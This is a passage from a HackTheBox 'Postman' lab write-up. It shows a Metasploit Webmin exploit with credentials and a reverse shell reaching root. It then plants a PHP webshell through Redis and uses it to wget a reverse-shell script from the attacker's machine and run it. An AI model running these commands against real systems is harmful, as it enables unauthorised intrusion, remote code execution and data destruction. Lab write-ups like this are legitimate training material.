 [!] Changing the SSL option's value may require changing RPORT!
 SSL =&gt; true
 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set USERNAME Matt
 USERNAME =&gt; Matt
 msf6 exploit(linux/http/webmin_packageup_rce) &gt; set LHOST tun0
 LHOST =&gt; 10.10.14.14
</pre></table></code></div></div><li>View <code class="language-plaintext highlighter-rouge">OPTIONS</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre> Module options (exploit/linux/http/webmin_packageup_rce):
	
    Name       Current Setting      Required  Description
    ----       ---------------      --------  -----------
    PASSWORD   computer2008         yes       Webmin Password
    Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS     10.10.10.160         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
    RPORT      10000                yes       The target port (TCP)
    SSL        true                 no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                    yes       Base path for Webmin application
    USERNAME   Matt                 yes       Webmin Username
    VHOST                           no        HTTP server virtual host
	
	
 Payload options (cmd/unix/reverse_perl):
	
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
	
	
 Exploit target:
	
    Id  Name
    --  ----
    0   Webmin &lt;= 1.910
</pre></table></code></div></div><li>Exploit!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> msf6 exploit(linux/http/webmin_packageup_rce) &gt; exploit
	
 [*] Started reverse TCP handler on 10.10.14.14:4444 
 [+] Session cookie: 901cb0ecb0496363e8b1a5d1405c87b2
 [*] Attempting to execute the payload...
 [*] Command shell session 4 opened (10.10.14.14:4444 -&gt; 10.10.10.160:53168 ) at 2022-09-22 01:14:03 +0800
	
 shell
 [*] Trying to find binary 'python' on the target machine
 [*] Found python at /usr/bin/python
 [*] Using `python` to pop up an interactive shell
 [*] Trying to find binary 'bash' on the target machine
 [*] Found bash at /bin/bash
 id
 uid=0(root) gid=0(root) groups=0(root)
 root@Postman:/usr/share/webmin/package-upda
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Postman/images/Pasted%20image%2020220922011448.png" alt="" data-proofer-ignore></p></ol><h1 id="additional">Additional</h1><h2 id="tcp6379-redis-key-value-store-409---configuring-rce-via-webshell-to-work">TCP/6379 (Redis key-value store 4.0.9) - Configuring RCE via Webshell to work <a href="#tcp6379-redis-key-value-store-409---configuring-rce-via-webshell-to-work" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View permissions of <code class="language-plaintext highlighter-rouge">/var/www/html</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> root@Postman:/var/www# ls -la 
 total 20
 drwxr-xr-x  3 root root 4096 Aug 25  2019 .
 drwxr-xr-x 13 root root 4096 Aug 25  2019 ..
 drwxr-xr-x  7 root root 4096 Aug 26  2019 html
</pre></table></code></div></div><li>Allow <code class="language-plaintext highlighter-rouge">redis</code> user to write<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> root@Postman:/var/www# chown redis:redis html/
 root@Postman:/var/www# ls -la
 total 20
 drwxr-xr-x  3 root  root  4096 Aug 25  2019 .
 drwxr-xr-x 13 root  root  4096 Aug 25  2019 ..
 drwxr-xr-x  7 redis redis 4096 Aug 26  2019 html
</pre></table></code></div></div><li>The file that is written through our commands in <code class="language-plaintext highlighter-rouge">redis-cli</code> is <code class="language-plaintext highlighter-rouge">rw-rw----</code>, since the webserver (<code class="language-plaintext highlighter-rouge">apache2</code>) is running as <code class="language-plaintext highlighter-rouge">www-data</code>, if <code class="language-plaintext highlighter-rouge">www-data</code> tries to read the webshell, it does not work.<li>We have to make <code class="language-plaintext highlighter-rouge">apache2</code> run as user <code class="language-plaintext highlighter-rouge">redis</code>, we can do by changing <code class="language-plaintext highlighter-rouge">User</code> and <code class="language-plaintext highlighter-rouge">Group</code> in <code class="language-plaintext highlighter-rouge">apache2</code> configuration file<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> root@Postman:/var/www/html# nano /etc/apache2/apache2.conf
 # These need to be set in /etc/apache2/envvars
 User redis
 Group redis
</pre></table></code></div></div><li>Restart <code class="language-plaintext highlighter-rouge">apache2</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> root@Postman:/var/www/html# sudo service apache2 restart
</pre></table></code></div></div><li><code class="language-plaintext highlighter-rouge">apache2</code> is now running as user <code class="language-plaintext highlighter-rouge">redis</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> root@Postman:/var/www/html# ps aux | grep apache2
 root      32555  0.0  1.7 331332 16528 ?        Ss   19:24   0:00 /usr/sbin/apache2 -k start
 redis     32556  0.0  0.9 335744  9116 ?        S    19:24   0:00 /usr/sbin/apache2 -k start
 redis     32557  0.0  0.9 335744  9116 ?        S    19:24   0:00 /usr/sbin/apache2 -k start
 redis     32558  0.0  0.9 335744  9116 ?        S    19:24   0:00 /usr/sbin/apache2 -k start
 redis     32559  0.0  0.9 335744  9116 ?        S    19:24   0:00 /usr/sbin/apache2 -k start
 redis     32560  0.0  0.9 335744  9116 ?        S    19:24   0:00 /usr/sbin/apache2 -k start
</pre></table></code></div></div></ol><h2 id="tcp6379-redis-key-value-store-409----rce-via-webshell">TCP/6379 (Redis key-value store 4.0.9) - RCE via Webshell <a href="#tcp6379-redis-key-value-store-409----rce-via-webshell" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Try <code class="language-plaintext highlighter-rouge">Redis RCE via Webshell</code><ol><li>Create webshell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# echo "&lt;?php system($_GET['c']);?&gt;" &gt; webshell.txt
</pre></table></code></div></div><li>Create webshell payload w/ padding<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> (echo -e "\n\n"; cat webshell.txt; echo -e "\n\n") &gt; padded_webshell.txt
</pre></table></code></div></div><li>Remove all keys in database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit]
 └─# redis-cli -h 10.10.10.160 flushall
 OK
</pre></table></code></div></div><li>Insert webshell onto <code class="language-plaintext highlighter-rouge">/var/www/html</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman]
 └─# redis-cli -h postman.htb
 postman.htb:6379&gt; config set dir /var/www/html/
 OK
 postman.htb:6379&gt; config set dbfilename redis.php
 OK
 postman.htb:6379&gt; set test "&lt;?php system($_GET['c']);?&gt;"
 OK
 postman.htb:6379&gt; save
 OK
 postman.htb:6379&gt; 
</pre></table></code></div></div><li>Test our Webshell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman]
 └─# curl 'http://postman.htb/webshell.php?c=id;whoami' --output -
 REDIS0008       redis-ver4.0.9
 redis-bits@ctime&lt;[+used-mem¨
		
                             aof-preamblecrackit"
		
		
 uid=107(redis) gid=114(redis) groups=114(redis)
 redis
		
		
		
 }Es9;
</pre></table></code></div></div><li>Tried all sorts of reverse shell payloads, did not work.<li>Instead download <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code> onto <code class="language-plaintext highlighter-rouge">postman.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> # Payload
 wget+-O+/tmp/shell.php+10.10.14.14/php-reverse-shell.php
		
 ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit/redis_webshell]
 └─# curl 'http://postman.htb/webshell.php?c=wget+-O+/tmp/shell.php+10.10.14.14/php-reverse-shell.php' --output - 
 REDIS0008       redis-ver4.0.9
 redis-bits@ctime&lt;[+used-mem¨
		
 ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit/redis_webshell]
 └─# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.10.160 - - [22/Sep/2022 02:47:27] "GET /php-reverse-shell.php HTTP/1.1" 200 -
</pre></table></code></div></div><li>Invoke <code class="language-plaintext highlighter-rouge">php-reverse-shell.php</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/postman/10.10.10.160/exploit/redis_webshell]
 └─# curl 'http://postman.htb/webshell.php?c=php+/tmp/shell.php' --output - 
</pre></table></code></div></div></ol><li>Demo - <code class="language-plaintext highlighter-rouge">redis RCE via Webshell</code><div style="width:100%;height:0px;position:relative;padding-bottom:101.983%;"><iframe src="https://streamable.com/e/zhzfdg" frameborder="0" width="100%" height="100%" allowfullscreen="" style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;"></iframe></div></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tcp-80-http-web-app-cms-exploit/" class="post-tag no-text-decoration" >tcp/80-http/web-app-cms-exploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Postman - Yufong&amp;u=https://yufongg.github.io/posts/Postman/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Blunder/"><div class="card-body"> <em class="timeago small" data-ts="1672502400" > 2023-01-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering bludit CMS running, it is vulnerable to a bruteforce protection bypass, directory traversal + image upload exec vulnerability. With ce...</p></div></div></a></div><div class="card"> <a href="/posts/Nibbles/"><div class="card-body"> <em class="timeago small" data-ts="1661097600" > 2022-08-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Nibbles</h3><div class="text-muted small"><p> Overview This machine begins w/ web directory enumeration revealing files and directories that discloses the username, CMS version and login page of the webpage, allowing us to login as an admin us...</p></div></div></a></div><div class="card"> <a href="/posts/Beep/"><div class="card-body"> <em class="timeago small" data-ts="1661184000" > 2022-08-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Beep</h3><div class="text-muted small"><p> Overview This machine has 4 ways to obtain an initial shell. For the 1st method, after a web enumeration at TCP/443 (HTTPS), it is discovered that Elastix running on the webserver. After searching ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Frolic/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Frolic</p></a> <a href="/posts/Mango/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Mango</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Postman/'; this.page.identifier = '/posts/Postman/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
